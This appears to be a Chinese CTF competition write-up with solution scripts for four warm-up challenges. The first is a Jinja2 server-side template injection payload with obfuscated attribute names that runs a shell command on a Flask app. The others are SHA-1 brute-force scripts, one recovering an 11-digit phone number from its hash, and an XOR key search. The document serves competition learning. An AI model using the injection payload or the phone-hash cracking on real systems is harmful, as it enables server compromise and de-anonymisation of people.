---
title: 春秋杯签到wp
date: 2025-01-27T10:56:08.989Z
---

# flask

```python
def string_to_hex(input_string):
    hex_string = ''.join(f'\\x{ord(char):02x}' for char in input_string)
    return hex_string


input_str = """__import__("os").popen("cat flag > ./static/1.txt").read()"""


print('{%print(()|attr("__cla"~"ss__")|attr("__ba"~"se__")|attr("__subc"~"lasses__")()|attr("__ge"~"tit"~"em__")(133)|attr("__in"~"it__")|attr("__glo"~"bals__")|attr("__ge"~"ti"~"tem__")("__bui"~"lt"~"ins__")|attr("__ge"~"ti"~"tem__")("ev"~"al")("'+string_to_hex(input_str)+'"))%}')
```

# 你是小哈斯？

```python
import hashlib
import itertools
import string

def sha1_hash(text):
    """计算字符串的 SHA-1 哈希值"""
    return hashlib.sha1(text.encode('utf-8')).hexdigest()

def brute_force_sha1(target_hash, max_length=1, charset=string.printable):
    """
    爆破 SHA-1 哈希值
    :param target_hash: 目标哈希值
    :param max_length: 尝试的最大字符长度
    :param charset: 字符集（默认为所有可打印字符）
    """
    for length in range(1, max_length + 1):  # 尝试不同长度
        for candidate in itertools.product(charset, repeat=length):  # 生成所有可能的组合
            candidate = ''.join(candidate)  # 将元组转换为字符串
            candidate_hash = sha1_hash(candidate)  # 计算哈希值
            if candidate_hash == target_hash:  # 如果匹配
                print(f"找到匹配: {candidate} -> {candidate_hash}")
                return candidate
    print(f"未找到匹配的字符串: {target_hash}")
    return None

# 目标哈希值（多行字符串）
target_hashes = """
356a192b7913b04c54574d18c28d46e6395428ab
da4b9237bacccdf19c0760cab7aec4a8359010b0
"""

# 将多行字符串拆分为单独的哈希值
target_hashes_list = target_hashes.splitlines()

# 存储所有爆破出来的字符
results = []

# 对每个哈希值进行爆破
for target_hash in target_hashes_list:
    print(f"爆破哈希值: {target_hash}")
    result = brute_force_sha1(target_hash)
    if result:
        results.append(result)

# 输出所有爆破出来的字符，中间没有分隔符
if results:
    print("爆破结果:", ''.join(results))
else:
    print("未找到任何匹配的字符串。")
```

爆破结果: 

1234567890-=qwertyuiopflag{no_is_flag}asdfghjklzxcvbnm,flag{game_cqb_isis_cxyz}.asdfghjklzxcvbnm,.qwertyuiopflag{no_is_flag}1234567890-=  

# 通往哈希的旅程

```python
import hashlib
from tqdm import tqdm  # 导入tqdm库

def crack_hash(target_hash):
    # 目标哈希值
    target_hash = target_hash.lower()  # 确保哈希值是小写

    # 遍历所有可能的号码
    for i in tqdm(range(100000000), desc="破解进度", unit="号码"):  # 使用tqdm显示进度条
        # 生成号码
        number = f"188{i:08d}"  # 格式化为11位号码，如18800000000

        # 计算SHA-1哈希值
        sha1_hash = hashlib.sha1(number.encode()).hexdigest()

        # 比较哈希值
        if sha1_hash == target_hash:
            print(f"\n破解成功！号码是: {number}")
            return number

    print("\n未找到匹配的号码。")
    return None

# 目标哈希值
target_hash = "ca12fd8250972ec363a16593356abb1f3cf3a16d"

# 开始破解
crack_hash(target_hash)
```

```
破解进度:  76%|█████████████████████████████████████████████████████████████████▎                    | 75912366/100000000 [01:03<00:19, 1212274.13号码/s]
破解成功！号码是: 18876011645
```

<br/>

# 简单算数

```python
encrypted = "ys~xdg/m@]mjkz@vl@z~lf>b"
for key in range(256):  # 遍历所有单字节密钥
    decrypted = ""
    for char in encrypted:
        decrypted += chr(ord(char) ^ key)  # 对每个字符进行 XOR 操作
    print(f"Key: {key} (Hex: {hex(key)}), Decrypted: {decrypted}")
```

```
Key: 31 (Hex: 0x1f), Decrypted: flag{x0r_Brute_is_easy!}
```
